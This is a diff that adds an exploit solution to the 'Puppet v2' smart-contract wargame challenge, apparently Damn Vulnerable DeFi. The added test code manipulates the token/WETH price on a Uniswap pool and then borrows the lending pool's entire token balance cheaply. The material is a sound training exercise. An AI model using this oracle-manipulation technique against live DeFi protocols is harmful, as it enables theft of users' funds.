@@ -82,6 +82,50 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        /* 
+            Vulnerability:
+            The lendingPool determines the weth required to borrow a given amount based on the
+            ratio of weth to token. The lower the weth to token ratio the lower the weth required.
+            The attacker therefore swaps their token balance for weth and then uses that weth to 
+            purchase the pool's token balance. 
+        */
+
+        // Flood the router with tokens in exchange for weth, driving down the price of weth
+        const attackerTokenBalance = await this.token.balanceOf(attacker.address)
+        await this.token
+            .connect(attacker)
+            .approve(this.uniswapRouter.address, attackerTokenBalance)
+
+        await this.uniswapRouter
+            .connect(attacker)
+            .swapExactTokensForETH(
+                attackerTokenBalance,
+                1,
+                [this.token.address, this.weth.address],
+                attacker.address,
+                (await ethers.provider.getBlock('latest')).timestamp * 2
+            )
+
+        // Get the amount of token in the pool
+        const poolTokenBalance = await this.token.balanceOf(this.lendingPool.address)
+
+        // Get the amount of weth to purchase the pool's token balance
+        // and convert eth to weth
+        const wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(poolTokenBalance)
+        await this.weth.connect(attacker).deposit({ value: wethRequired })
+
+        // Purchase all the tokens in the pool
+        await this.weth
+            .connect(attacker)
+            .approve(
+                this.lendingPool.address, 
+                await this.weth.balanceOf(attacker.address)
+            )
+
+        await this.lendingPool
+            .connect(attacker)
+            .borrow(poolTokenBalance)
     });
 
     after(async function () {
